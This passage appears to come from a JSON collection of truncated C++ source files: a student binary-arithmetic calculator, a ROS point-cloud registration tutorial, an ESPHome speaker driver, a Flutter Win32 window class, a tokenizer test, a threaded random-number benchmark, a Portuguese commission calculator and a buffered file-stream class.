}\n        dec1 = dec1 + (rem1*i1);\n        dec2 = dec2 + (rem2*i2);\n        i1 = i1*2;\n        i2 = i2*2;\n        bin1 = bin1/10;\n        bin2 = bin2/10;\n    }\n    if(inspct==0)\n    {\n        result=dec1-dec2;\n        cout<<\"Decimal Values: \";\n        cout<<dec1<<\" * \"<<dec2<<\" = \"<<result;\n        int DeciNum, BinNum[20], i=0;\n        DeciNum=result;\n        while(DeciNum!=0)\n        {\n            BinNum[i] = DeciNum%2;\n            i++;\n            DeciNum = DeciNum/2;\n        }\n        cout<<\"\\nEquivalent Binary Result: \";\n        for(i=(i-1); i>=0; i--)\n            cout<<BinNum[i];\n        cout<<endl;\n    } else\n        system(\"cls\");\n    cout<<\"Invalid\";\n\n    ConvertAnother();\n    cout<<endl;\n\n}\nvoid  mul()\n{\n    int bin1, bin2, dec1=0, dec2=0, i1=1, i2=1, inspct=0, rem1, rem2, result = 0;\n\n    cout<<\" Enter the First Binary Number: \";\n    cin>>bin1;\n    cout<<\" Enter the Second Binary Number: \";\n    cin>>bin2;\n    while(bin1!=0 && bin1!=0)\n    {\n        rem1 = bin1%10;\n        rem2 = bin2%10;\n        if(rem1>1&&rem2>1)\n        {   inspct++;\n            break;\n        }\n        dec1 = dec1 + (rem1*i1);\n        dec2 = dec2 + (rem2*i2);\n        i1 = i1*2;\n        i2 = i2*2;\n        bin1 = bin1/10;\n        bin2 = bin2/10;\n    }\n    if(inspct==0)\n    {\n        result = dec1*dec2;\n        cout<<\"Decimal Values: \";\n        cout<<dec1<<\" * \"<<dec2<<\" = \"<<result;\n        int DeciNum, BinNum[20], i=0;\n        DeciNum = result;\n        while(DeciNum!=0)\n        {\n            BinNum[i] = DeciNum%2;\n            i++;\n            DeciNum = DeciNum/2;\n\n        }\n        cout<<\"\\nEquivalent Binary Result: \";\n        for(i=(i-1); i>=0; i--)\n\n            cout<<BinNum[i];\n        cout<<endl;\n\n\n    } else\n        system(\"cls\");\n    cout<<\"Invalid\";\n\n    ConvertAnother();\n    cout<<endl;\n\n}\nvoid div()\n{\n    int bin1, bin2, dec1=0, dec2=0, i1=1, i2=1, inspct=0, rem1, rem2, result =0;\n\n    cout<<\"Enter the First Binary Number: \";\n    cin>>bin1;\n    cout<<\"Enter the Second Binary Number: \";\n    cin>>bin2;\n    while(bin1!=0 && bin1!=0)\n    {\n        rem1 = bin1%10;\n        rem2 = bin2%10;\n        if(rem1>1 && rem2>1)\n        {   inspct++;\n            break;\n        }\n        dec1 = dec1 + (rem1*i1);\n        dec2 = dec2 + (rem2*i2);\n        i1 = i1*2;\n        i2 = i2*2;\n        bin1 = bin1/10;\n        bin2 = bin2/10;\n    }\n    if(inspct==0)\n    {\n        result=dec1/dec2;\n\n        cout<<\"Decimal Values: \";\n        cout<<dec1<<\" / \"<<dec2<<\" = \"<<result;\n        int DeciNum, BinNum[20], i=0;\n        DeciNum = result;\n        while(DeciNum!=0)\n        {\n     ",
    "#include \"pcl_registration_tutorial.hpp\"\n\n\nPclRegistrationTutorial::PclRegistrationTutorial()\n{\n    // Point cloud Pointer \ucd08\uae30\ud654\n    pcd_source_pcptr_.reset(new pcl::PointCloud<pcl::PointXYZ>());\n    pcd_target_pcptr_.reset(new pcl::PointCloud<pcl::PointXYZ>());\n    pcd_source_registered_pcptr_.reset(new pcl::PointCloud<pcl::PointXYZ>());\n\n}\n\nPclRegistrationTutorial::~PclRegistrationTutorial()\n{\n\n}\n\nvoid PclRegistrationTutorial::Init()\n{\n    ROS_INFO(\"Init\");\n\n    ros::NodeHandle nh;\n\n    if(CheckParam() == false){\n        ROS_ERROR(\"Init Fail\");\n        return;\n    }\n\n\n    p_pcd_source_origin_ = nh.advertise<sensor_msgs::PointCloud2>(\"source_pcd_origin\", 10);\n    p_pcd_target_origin_ = nh.advertise<sensor_msgs::PointCloud2>(\"target_pcd_origin\", 10);\n\n    p_pcd_source_registered_ = nh.advertise<sensor_msgs::PointCloud2>(\"source_pcd_registered\", 10);\n\n\n    // Load PCD\n    if (pcl::io::loadPCDFile<pcl::PointXYZ> (cfg_str_pcd_source_path_, *pcd_source_pcptr_) == -1){\n        ROS_ERROR_STREAM(\"Cannot Read file: \" << cfg_str_pcd_source_path_);\n        return;\n    }\n    else{\n        ROS_WARN_STREAM(\"File Loaded From: \" << cfg_str_pcd_source_path_);\n    }\n\n    if (pcl::io::loadPCDFile<pcl::PointXYZ> (cfg_str_pcd_target_path_,*pcd_target_pcptr_) == -1){\n        ROS_ERROR_STREAM(\"Cannot Read file: \" << cfg_str_pcd_target_path_);\n        return;\n    }\n    else{\n        ROS_WARN_STREAM(\"File Loaded From: \" << cfg_str_pcd_target_path_);\n    }\n\n    // Source Transform\n    Eigen::Affine3f source_tranform_tf = pcl::getTransformation(cfg_d_target_move_x_m_, cfg_d_target_move_y_m_,cfg_d_target_move_z_m_,\n            cfg_d_target_rot_roll_deg_*M_PI/180.0, cfg_d_target_rot_pitch_deg_*M_PI/180.0, cfg_d_target_rot_yaw_deg_*M_PI/180.0);\n\n    pcl::transformPointCloud(*pcd_source_pcptr_, *pcd_source_pcptr_, source_tranform_tf);\n\n    // Target Downample\n    pcl::VoxelGrid<pcl::PointXYZ> voxel_grid_cluster;\n    voxel_grid_cluster.setLeafSize(cfg_d_target_voxel_m_,cfg_d_target_voxel_m_,cfg_d_target_voxel_m_);\n    voxel_grid_cluster.setInputCloud(pcd_target_pcptr_);\n    voxel_grid_cluster.filter(*pcd_target_pcptr_);\n\n    ROS_INFO(\"Init Done\");\n    b_is_init_ = true;\n}\n\nbool PclRegistrationTutorial::CheckParam()\n{\n    ros::NodeHandle nh;\n    if (!nh.getParam(\"/pcd_path/pcd_source\", cfg_str_pcd_source_path_)) return false;  \n    if (!nh.getParam(\"/pcd_path/pcd_target\", cfg_str_pcd_target_path_)) return false;  \n\n    if (!nh.getParam(\"/pcl_registration_tutorial/registration_method\", cfg_i_registration_method_)) return false;  \n    if (!nh.getParam(\"/pcl_registration_tutorial/target_voxel_m\", cfg_d_target_voxel_m_)) return false;  \n\n    if (!nh.getParam(\"/pcl_registration_tutorial/target_move_x_m\", cfg_d_target_move_x_m_)) return false;  \n    if (!nh.getParam(\"/pcl_registration_tutorial/target_move_y_m\", cfg_d_target_move_y_m_)) return false;  \n    if (!nh.getParam(\"/pcl_registration_tutorial/target_move_z_m\", cfg_d_target_move_z_m_)) return false;  \n    if (!nh.getParam(\"/pcl_registration_tutorial/target_rot_roll_deg\", cfg_d_target_rot_roll_deg_)) return false;  \n    if (!nh.getParam(\"/pcl_registration_tutorial/target_rot_pitch_deg\", cfg_d_target_rot_pitch_deg_)) return false;  \n    if (!nh.getParam(\"/pcl_registration_tutorial/target_rot_yaw_deg\", cfg_d_target_rot_yaw_deg_)) return false;  \n\n    if (!nh.getParam(\"/pcl_registration_tutorial/max_search_distance\", cfg_d_max_search_distance_)) return false;  \n    if (!nh.getParam(\"/pcl_registration_tutorial/transform_epsilone\", cfg_d_transform_epsilon_)) return false;  \n    if (!nh.getParam(\"/pcl_registration_tutorial/max_iteration\", cfg_i_max_iteration_)) return false;  \n\n    if (!nh.getParam(\"/pcl_registration_tutorial/ndt_voxel_size_m\", cfg_d_ndt_voxel_size_m_)) return false;  \n\n\n    std::string dir(ros::package::getPath(\"pcl_registration_tutorial\") + \"/../../\");\n    cfg_str_pcd_source_path_ = dir + cfg_str_pcd_source_path_;\n    cfg_str_pcd_target_path_ = dir + cfg_str_pcd_target_path_;\n\n    std::cout<<\"cfg_str_pcd_source_path_: \"<<cfg_str_pcd_source_path_<<std::endl;\n    std::cout<<\"cfg_str_pcd_target_path_: \"<<cfg_str_pcd_target_path_<<std::endl;\n    std::cout<<\"cfg_i_registration_method_: \"<<cfg_i_registration_method_<<std::endl;\n\n    std::cout<<\"cfg_d_target_move_x_m_: \"<<cfg_d_target_move_x_m_<<std::endl;\n    std::cout<<\"cfg_d_target_move_y_m_: \"<<cfg_d_target_move_y_m_<<std::endl;\n    std::cout<<\"cfg_d_target_move_z_m_: \"<<cfg_d_target_move_z_m_<<std::endl;\n    std::cout<<\"cfg_d_target_rot_roll_deg_: \"<<cfg_d_target_rot_roll_deg_<<std::endl;\n    std::cout<<\"cfg_d_target_rot_pitch_deg_: \"<<cfg_d_target_rot_pitch_deg_<<std::endl;\n    std::cout<<\"cfg_d_target_rot_yaw_deg_: \"<<cfg_d_target_rot_yaw_deg_<<std::endl;\n\n    return true;\n}\n\nvoid PclRegistrationTutorial::Run()\n{\n    \n    if(b_is_init_ == false) return;\n    ROS_INFO(\"Run\");\n    \n    switch(cfg_i_registration_method_){\n        case EnumRegistrationMethod::ICP:\n            IcpRegistration();\n            break;\n\n        case EnumRe",
    "#include \"nabu_speaker.h\"\n\n#ifdef USE_ESP32\n\n#include <driver/i2s.h>\n\n#include \"esphome/core/application.h\"\n#include \"esphome/core/hal.h\"\n#include \"esphome/core/log.h\"\n\nnamespace esphome {\nnamespace nabu {\n\nstatic const size_t BUFFER_COUNT = 20;\n\nstatic const char *const TAG = \"nabu.speaker\";\n\nvoid NabuSpeaker::setup() {\n  ESP_LOGCONFIG(TAG, \"Setting up I2S Audio Speaker...\");\n\n  this->buffer_queue_ = xQueueCreate(BUFFER_COUNT, sizeof(DataEvent));\n  this->event_queue_ = xQueueCreate(BUFFER_COUNT, sizeof(TaskEvent));\n}\n\nvoid NabuSpeaker::start() { this->state_ = speaker::STATE_STARTING; }\nvoid NabuSpeaker::start_() {\n  this->parent_->start_i2s();\n  this->state_ = speaker::STATE_RUNNING;\n\n  xTaskCreate(NabuSpeaker::player_task, \"speaker_task\", 8192, (void *)this, 0,\n              &this->player_task_handle_);\n}\n\nvoid NabuSpeaker::player_task(void *params) {\n  NabuSpeaker *this_speaker = (NabuSpeaker *)params;\n\n  TaskEvent event;\n  event.type = TaskEventType::STARTING;\n  xQueueSend(this_speaker->event_queue_, &event, portMAX_DELAY);\n\n  DataEvent data_event;\n\n  event.type = TaskEventType::STARTED;\n  xQueueSend(this_speaker->event_queue_, &event, portMAX_DELAY);\n\n  int16_t buffer[BUFFER_SIZE / 2];\n\n  while (true) {\n    if (xQueueReceive(this_speaker->buffer_queue_, &data_event,\n                      100 / portTICK_PERIOD_MS) != pdTRUE) {\n      break; // End of audio from main thread\n    }\n    if (data_event.stop) {\n      // Stop signal from main thread\n      xQueueReset(this_speaker->buffer_queue_); // Flush queue\n      break;\n    }\n    size_t bytes_written;\n\n    memmove(buffer, data_event.data, data_event.len);\n    size_t remaining = data_event.len / 2;\n    size_t current = 0;\n\n    while (remaining > 0) {\n      uint32_t sample = (buffer[current] << 16) | (buffer[current] & 0xFFFF);\n      uint32_t samples[2] = {sample, sample};\n\n      esp_err_t err =\n          i2s_write(this_speaker->parent_->get_port(), &samples,\n                    sizeof(samples), &bytes_written, (10 / portTICK_PERIOD_MS));\n      if (err != ESP_OK) {\n        event = {.type = TaskEventType::WARNING, .err = err};\n        xQueueSend(this_speaker->event_queue_, &event, portMAX_DELAY);\n        continue;\n      }\n      remaining--;\n      current++;\n    }\n\n    event.type = TaskEventType::PLAYING;\n    xQueueSend(this_speaker->event_queue_, &event, portMAX_DELAY);\n  }\n\n  i2s_zero_dma_buffer(this_speaker->parent_->get_port());\n\n  event.type = TaskEventType::STOPPING;\n  xQueueSend(this_speaker->event_queue_, &event, portMAX_DELAY);\n\n  event.type = TaskEventType::STOPPED;\n  xQueueSend(this_speaker->event_queue_, &event, portMAX_DELAY);\n\n  while (true) {\n    delay(10);\n  }\n}\n\nvoid NabuSpeaker::stop() {\n  if (this->state_ == speaker::STATE_STOPPED)\n    return;\n  if (this->state_ == speaker::STATE_STARTING) {\n    this->state_ = speaker::STATE_STOPPED;\n    return;\n  }\n  this->state_ = speaker::STATE_STOPPING;\n  DataEvent data;\n  data.stop = true;\n  xQueueSendToFront(this->buffer_queue_, &data, portMAX_DELAY);\n}\n\nvoid NabuSpeaker::watch_() {\n  TaskEvent event;\n  if (xQueueReceive(this->event_queue_, &event, 0) == pdTRUE) {\n    switch (event.type) {\n    case TaskEventType::STARTING:\n      ESP_LOGD(TAG, \"Starting I2S Audio Speaker\");\n      break;\n    case TaskEventType::STARTED:\n      ESP_LOGD(TAG, \"Started I2S Audio Speaker\");\n      break;\n    case TaskEventType::STOPPING:\n      ESP_LOGD(TAG, \"Stopping I2S Audio Speaker\");\n      break;\n    case TaskEventType::PLAYING:\n      this->status_clear_warning();\n      break;\n    case TaskEventType::STOPPED:\n      this->state_ = speaker::STATE_STOPPED;\n      vTaskDelete(this->player_task_handle_);\n      this->player_task_handle_ = nullptr;\n      xQueueReset(this->buffer_queue_);\n      ESP_LOGD(TAG, \"Stopped I2S Audio Speaker\");\n      break;\n    case TaskEventType::WARNING:\n      ESP_LOGW(TAG, \"Error writing to I2S: %s\", esp_err_to_name(event.err));\n      this->status_set_warning();\n      break;\n    }\n  }\n}\n\nvoid NabuSpeaker::loop() {\n  switch (this->state_) {\n  case speaker::STATE_STARTING:\n    this->start_();\n    break;\n  case speaker::STATE_RUNNING:\n  case speaker::STATE_STOPPING:\n    this->watch_();\n    break;\n  case speaker::STATE_STOPPED:\n    break;\n  }\n}\n\nsize_t NabuSpeaker::play(const uint8_t *data, size_t length) {\n  if (this->state_ != speaker::STATE_RUNNING &&\n      this->state_ != speaker::STATE_STARTING) {\n    this->start();\n  }\n  size_t remaining = length;\n  size_t index = 0;\n  while (remaining > 0) {\n    DataEvent event;\n    event.stop = false;\n    size_t to_send_length = std::min(remaining, BUFFER_SIZE);\n    event.len = to_send_length;\n    memcpy(event.data, data + index, to_send_length);\n    if (xQueueSend(this->buffer_queue_, &event, 0) != pdTRUE) {\n      return index;\n    }\n    remaining -= to_send_length;\n    index += to_send_length;\n  }\n  return index;\n}\n\nbool NabuSpeaker::has_buffered_data() const {\n  return uxQueueMessagesWaiting(this->buffer_queue_) > 0;\n}\n\n} // namespace nabu\n} // namespace esphome",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    Se",
    "#include <iostream>\n#include <fstream>\n#include <chrono>\n#include \"opt_infer_engine.h\"\n#include \"tokenization.h\"\n\nint main() {\n    std::cout << \"initializing...\" << std::endl;\n    auto gpt2Tokenizer = tokenizer::GPT2Tokenizer(\"../vocab.json\", \"../merges.txt\",50272, 0, L\"<unk>\");\n    std::string text = \"huangwei, huangwei askdjlasjdlkas lkjasld\";\n    auto ids = gpt2Tokenizer.convertTokensToIds(gpt2Tokenizer.tokenize(text));\n\n    std::cout << \"ids size: \" << ids.size() << std::endl;\n    for (auto &id : ids) {\n        std::cout << id << \" \";\n    }\n//    std::ofstream outfile(\"execution_times.txt\");\n//\n//    for (int i = 0; i < 50; ++i) {\n//        auto start = std::chrono::high_resolution_clock::now();\n//        std::string return_string = opt_infer_engine.getReturnString(text);\n//        auto end = std::chrono::high_resolution_clock::now();\n//        auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);\n//        std::cout << return_string << std::endl;\n//        outfile << \"Execution \" << i + 1 << \": \" << duration.count() << \" microseconds\" << std::endl;\n//    }\n//\n//    outfile.close();\n\n    return 0;\n}\n",
    "#include <chrono> \n#include <iostream>\n#include <random>\n#include <string>\n#include <sstream>\n#include <thread>\n#include <vector>\n\n#include \"ArgHandler.hpp\"\n\n// Global random number generator\nstd::mt19937_64 generator; \n\n// Function declarations\nvoid generateRandomNumbers(unsigned long long);\nstd::chrono::system_clock::time_point spawnThreads(\n  unsigned long long, unsigned long long);\n\n// Main\nint main(int argc, char* argv[]) {\n\n  // Argument variables\n  unsigned long long threads, iterations;  \n\n  // Seed generator\n  generator.seed(std::random_device()());\n\n  // Parse arguments\n  int result = ArgHandler(argc, argv);\n\n  if(result == 0) return 1;\n\n  if(result == 1) {\n    try {\n      std::stringstream(argv[2]) >> iterations;\n    } catch(const std::exception& e) {\n      std::cout << \"Error parsing iterations\\n\";\n    }\n\n    try {  \n      std::stringstream(argv[3]) >> threads;\n    } catch(const std::exception& e) {\n      std::cout << \"Error parsing threads\\n\";\n    }\n  } else if(result == -1) {}\n\n  // Start timer\n  auto start = std::chrono::high_resolution_clock::now();\n\n  // Spawn threads\n  auto end = spawnThreads(threads, iterations);\n\n  // Print elapsed time\n  std::chrono::duration<double, std::milli> ms = end - start;\n  std::cout << std::endl << \"Time taken: \" << ms.count() << \"ms\\n\";\n\n  return 0;\n\n}\n\nstd::chrono::system_clock::time_point spawnThreads(unsigned long long threads, unsigned long long iterations) {\n\n  std::vector<std::thread> threadPool(threads);\n\n  for(unsigned long long i = 0; i < threads; i++) {\n    threadPool[i] = std::thread(generateRandomNumbers, iterations); \n  }\n\n  for(auto& thread : threadPool) {\n    thread.join();\n  }\n\n  return std::chrono::system_clock::now();\n\n}\n\nvoid generateRandomNumbers(unsigned long long iterations) {\n\n  for(unsigned long long i = 0; i < iterations; i++) {\n    std::cout << generator();\n  }\n\n}\n",
    "#include <iostream>\r\n#include <iomanip>\r\n\r\nusing namespace std;\r\n\r\nint main() {\r\n    int codigo_representante;\r\n    float total_itens, total_vendas = 0, valor_pedido, comissao, total_comissao = 0;\r\n    float total_representante1 = 0, total_representante2 = 0, total_representante3 = 0, total_representante4 = 0;\r\n    char continuar;\r\n\r\n    cout << fixed << setprecision(2);\r\n\r\n    do {\r\n        do{\r\n        cout << \"Digite o codigo do representante (1 a 4): \";\r\n        cin >> codigo_representante;\r\n        } while(codigo_representante < 1 or codigo_representante > 4);\r\n        \r\n        do{\r\n        cout << \"Digite o total de itens do pedido: \";\r\n        cin >> total_itens;\r\n        } while(total_itens < 0);\r\n\r\n        do{\r\n        cout << \"Digite o valor total da venda: \";\r\n        cin >> valor_pedido;\r\n        } while (valor_pedido < 0);\r\n        \r\n        if (total_itens < 20)\r\n            comissao = valor_pedido * 0.10;\r\n        else if (total_itens >= 20 && total_itens <= 49)\r\n            comissao = valor_pedido * 0.15;\r\n        else if (total_itens >= 50 && total_itens <= 74)\r\n            comissao = valor_pedido * 0.20;\r\n        else\r\n            comissao = valor_pedido * 0.25;\r\n\r\n        total_vendas += valor_pedido;\r\n        total_comissao += comissao;\r\n\r\n        switch (codigo_representante) {\r\n            case 1:\r\n                total_representante1 += comissao;\r\n                break;\r\n            case 2:\r\n                total_representante2 += comissao;\r\n                break;\r\n            case 3:\r\n                total_representante3 += comissao;\r\n                break;\r\n            case 4:\r\n                total_representante4 += comissao;\r\n                break;\r\n        }\r\n\r\n        cout << \"Valor da comiss\u00e3o: \" << comissao << endl;\r\n        \r\n        do{\r\n        cout << \"Deseja informar mais um pedido? (S/N): \";\r\n        cin >> continuar;\r\n        continuar = toupper(continuar);\r\n        } while(continuar != 'S' and continuar != 'N');\r\n   \r\n    } while (continuar != 'N' && continuar != 'n');\r\n\r\n    cout << \"Total de vendas dos pedidos processados: \" << total_vendas << endl;\r\n    cout << \"Total de comissoes para o representante 1: \" << total_representante1 << endl;\r\n    cout << \"Total de comissoes para o representante 2: \" << total_representante2 << endl;\r\n    cout << \"Total de comissoes para o representante 3: \" << total_representante3 << endl;\r\n    cout << \"Total de comissoes para o representante 4: \" << total_representante4 << endl;\r\n    cout << \"Total de comissoes que a companhia pagou aos seus representantes: \" << total_comissao << endl;\r\n\r\n    return 0;\r\n}",
    "\n\n\n#include \"SPStream.h\"\n#include \"SPResourceBaseDEF.h\"\n#include \"SPResourceBase.h\"\n\n\nSPFileStream::SPFileStream(const char* pszFilename, int iMode )\n{\n\tswitch ( iMode ) {\n\tcase OPEN_READ_ASCII :\n\t\tm_iFileHandle=::_open( pszFilename, _O_RDONLY | _O_TEXT );\t\t\n\t\tbreak;\n\n\tcase OPEN_WRITE_ASCII :\n\t\tm_iFileHandle=::_open( pszFilename, _O_RDWR| _O_TEXT | _O_TRUNC | _O_CREAT, S_IREAD | S_IWRITE );\n\t\tbreak;\n\n\tcase OPEN_READWRITE_ASCII :\n\t\tm_iFileHandle=::_open( pszFilename, _O_RDWR | _O_TEXT );\n\t\tbreak;\n\n\tcase OPEN_CREATE_ASCII :\n\t\tm_iFileHandle=::_open( pszFilename, _O_RDWR | _O_CREAT | _O_TEXT, S_IREAD | S_IWRITE );\n\t\tbreak;\n\n\tcase OPEN_WRITE :\n\t\tm_iFileHandle=::_open( pszFilename, _O_RDWR| _O_BINARY | _O_TRUNC | _O_CREAT, S_IREAD | S_IWRITE );\n\t\tbreak;\n\n\tcase OPEN_READWRITE :\n\t\tm_iFileHandle=::_open( pszFilename, _O_RDWR | _O_BINARY );\n\t\tbreak;\n\n\tcase OPEN_CREATE :\n\t\tm_iFileHandle=::_open( pszFilename, _O_RDWR | _O_CREAT | _O_BINARY, S_IREAD | S_IWRITE );\n\t\tbreak;\n\n\tcase OPEN_READ :\n\tdefault :\n\t\tm_iFileHandle=::_open( pszFilename, _O_RDONLY | _O_BINARY );\t\t\n\t\tbreak;\n\t}\n}\n\nSPFileStream::~SPFileStream()\n{\n\tif ( m_iFileHandle != -1 )\n\t\t::_close( m_iFileHandle );\n}\n\nvoid SPFileStream::Release()\n{\n\tdelete this; //\u6f9c\u6f9c..\u5165\u5165..\n}\n\nint SPFileStream::Seek( int iOffset, int iOrigin )\n{\n\treturn ::_lseek( m_iFileHandle, iOffset, iOrigin );\n}\n\nint SPFileStream::Read( void* ptr, unsigned int iSize )\n{\n\treturn ::_read( m_iFileHandle, ptr, iSize );\n}\n\nint SPFileStream::Write( const void *ptr, unsigned int iSize )\n{\n\treturn ::_write( m_iFileHandle, ptr, iSize );\n}\n\nbool SPFileStream::Eos() const\n{\n\treturn ::_eof( m_iFileHandle )!=0;\n}\n\nunsigned int SPFileStream::Tell() const\n{\n\treturn ::_tell( m_iFileHandle );\n}\n\nunsigned int SPFileStream::Length() const\n{\n\treturn ::_filelength( m_iFileHandle );\n}\n\nbool SPFileStream::Valid() const\n{\n\treturn m_iFileHandle != -1;\n}\n\n\n//////////////////////////////////////////////////////////////////////////\n//////////////////////////////////////////////////////////////////////////\nSPCacheFileStream::SPCacheFileStream(const char* pszFilename, int iMode)\n\t: SPFileStream(pszFilename, iMode)\n{\n}\n\nSPCacheFileStream::~SPCacheFileStream()\n{\n}\n\nunsigned int SPCacheFileStream::Tell() const\n{\n\tint\t\t\t\tnPos\t\t= m_nSize-m_nCurPos;\n\t\n\t::_lseek( m_iFileHandle, -nPos, SEEK_CUR );\n\tm_nCurPos\t\t= 0;\n\tm_nSize\t\t\t= 0;\n\n\treturn SPFileStream::Tell();\n}\n\nbool SPCacheFileStream::Eos() const\n{\n\t// \u8868\u793a\u8fd8\u6709\u6570\u636e\uff0c\u6587\u4ef6\u6ca1\u6709\u8bfb\u53d6\u7ed3\u675f\n\tif (m_nCurPos != m_nSize)\n\t\treturn false;\n\t// \u6587\u4ef6\u8bfb\u53d6\u5b8c\u6bd5\uff0c\u53c8\u57fa\u7c7b\u5224\u65ad\n\treturn SPFileStream::Eos();\n}\n\nint SPCacheFileStream::Seek( int iOffset, int iOrigin )\n{\n\tint\t\t\t\tnPos\t\t= m_nSize-m_nCurPos;\n\t\n\t::_lseek( m_iFileHandle, -nPos, SEEK_CUR );\n\tm_nCurPos\t\t= 0;\n\tm_nSize\t\t\t= 0;\n\n\treturn ::_lseek( m_iFileHandle, iOffset, iOrigin );\n}\n\nint SPCacheFileStream::Read( void* ptr, unsigned int iSize )\n{\n\t// return ::_read( m_iFileHandle, ptr, iSize );\n#if 1\n\tif (m_nCurPos > m_nSize)\n\t\treturn 0;\n\tunsigned int\tvalid\t= m_nSize - m_nCurPos;\n\tif (valid < iSize)\n\t{\n\t\tchar*\t\tp\t\t= (char*)ptr;\n\t\t// \u7f13\u51b2\u4e2d\u6ca1\u6709\u8db3\u591f\u6570\u636e\n\t\t// 1\u3001\u5c06\u7f13\u51b2\u7684\u6570\u636e\u590d\u5236\u7ed9ptr\n\t\tif (valid > 0)\n\t\t{\n\t\t\tmemcpy(p, &m_buf[m_nCurPos], valid);\n\t\t\tp\t\t\t+= valid;\n\t\t\tiSize\t\t-= valid;\n\t\t}\n\t\t// 2\u3001\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u5269\u4e0b\u7684\u6570\u636e\n\t\tm_nCurPos\t\t= _read(m_iFileHandle, p, iSize);\n\t\tp\t\t\t\t+= m_nCurPos;\n\t\n\t\t// \u9884\u5148\u8bfb\u5165\u6570\u636e\u5230\u7f13\u51b2\u533a\u4e2d\n\t\tm_nSize\t\t= _read(m_iFileHandle, m_buf, sizeof(m_buf));\n\t\tm_nCurPos\t= 0;\n\n\t\treturn (int)(p-(char*)ptr);\n\t}\n\t// \u6709\u8db3\u591f\u7684\u6570\u636e\n\tmemcpy(ptr, &m_buf[m_nCurPos], iSize);\n\tm_nCurPos\t+= iSize;\n\t\n\treturn iSize;\n\n#else\n\tif (m_nCurPos > m_nSize)\n\t\treturn 0;\n\tunsigned int\tvalid\t= m_nSize - m_nCurPos;\n\tif (valid < 